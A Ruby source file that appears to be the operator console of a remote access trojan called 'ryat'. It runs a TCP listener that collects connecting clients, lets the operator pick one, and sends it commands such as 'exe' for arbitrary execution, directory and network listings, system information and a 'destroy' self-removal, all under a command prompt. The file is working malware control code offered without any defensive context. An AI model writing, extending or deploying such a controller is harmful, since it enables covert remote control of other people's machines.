#!/usr/bin/env ruby

require 'socket'
require 'colorize'

class Client
  attr_accessor :connection, :addr, :uid

  def initialize(connection, addr, uid)
    @connection = connection
    @addr = addr
    @uid = uid
  end

  def to_s
    "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
  end
end

class Server
  attr_accessor :client_count, :current_client

  def initialize(port)
    @client_count = 0
    @current_client = nil
    @clients = {}
    @server = TCPServer.new(port)
    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
  end

  def run
    loop do
      begin
        connection = @server.accept
        client_id = @client_count + 1

        client = Client.new(
          connection,
          connection.peeraddr[3],
          client_id
        )
        puts "\nNew connection => #{client}".green

        @clients[client_id] = client
        @client_count += 1
      rescue Exception => e
        puts e.backtrace.red
      end
    end
  end

  def select_client(id)
    begin
      @current_client = @clients[id]
      raise NoMethodError if @current_client.nil?
      puts "Client #{id} selected".green
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def unselect
    @current_client = nil
  end

  def get_clients
    cli = []
    @clients.each_value { |c| cli << c }
    cli
  end

  def list_clients
    return 'No clients available'.red if @clients.empty?
    get_clients.each { |client| puts client }
  end

  def send_client(msg, client)
    begin
      client.connection.write(msg)
    rescue Exception => e
      puts e.backtrace.red
    end
  end

  def recv_client(client)
    begin
      len = client.connection.gets
      client.connection.read(len.to_i)
    rescue Exception => e
      puts e.backtrace.red
    end
  end

  def destroy_client(id)
    begin
      client = @clients[id]
      raise NoMethodError if client.nil?

      if @current_client
        unselect if @current_client.uid == id
      end

      send_client('destroy', client)
      @clients.delete(id)
      @client_count -= 1
      puts "Client #{id} destroyed".yellow
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def heartbeat
    # Check if clients are still alive and responding, remove otherwise
    get_clients.each do |temp_client|
      send_client('heartbeat', temp_client)
      beat = recv_client(temp_client)
      destroy_client(temp_client.uid) if beat != 'alive'
    end
    puts "Heartbeat Finished - All non-responding clients removed.".green
  end

  def quit
    print "Exit server but keep clients active? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    exit 0 if inp == 'yes' || inp == 'y'
  end

  def hardexit
    print "Exit server and destroy all clients? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    if inp == 'yes' || inp == 'y'
      get_clients.each { |client| send_client('destroy', client) }
      exit 0
    end
  end
end

def help(server_cmds, client_cmds)
  puts "Server Commands:".green
  server_cmds.each { |gen| puts "- #{gen}" }
  puts "\nClient Commands:".green
  client_cmds.each { |cli| puts "- #{cli}" }
end

def get_input(prompt = 'ryat>')
  print "#{prompt} "
  $stdin.gets.chomp
end

def start
  port = ARGV[0]
  port ||= 3200

  client = nil
  data = nil
  history = []
  server = Server.new(port)

  Thread.new { server.run }
  puts "Sever started on port #{port}".green

  client_cmds = %w[
    exe ls pwd pid ifconfig system
  ]

  server_cmds = %w[
    help select unselect clients heartbeat history destroy hardexit exit
  ]
  loop do
    if server.current_client.nil?
      input = get_input
    else
      input = get_input("ryat (Client #{server.current_client.uid})> ")
    end
    next if input.nil?
    history.push(input)
    cmd, action = input.split(' ')

    if client_cmds.include?(input) && server.current_client.nil?
      puts "Client specific command used".red
      puts "Select a client first (#{server.client_count} available)".red
      next
    end

    case cmd
    # Server Commands
    when 'help'
      help(server_cmds, client_cmds)
    when 'select'
      server.select_client(action.to_i)
    when 'unselect'
      server.unselect
    when 'clients'
      server.list_clients
    when 'heartbeat'
      server.heartbeat
    when 'hardexit'
      server.hardexit
    when 'history'
      history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
    when 'destroy'
      server.destroy_client(action.to_i)
    when 'exit'
      server.quit
      next
    when 'hardexit'
      server.hardexit
      next
    # Client Commands
    when 'exe'
      next if action.nil?
      server.send_client(input, server.current_client)
      data = server.recv_client(server.current_client)
    when 'ls', 'pwd', 'pid', 'ifconfig', 'system'
      server.send_client(cmd, server.current_client)
      data = server.recv_client(server.current_client)
    else
      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
    end
    puts data unless data.nil?
    data = nil
  end
end

start()
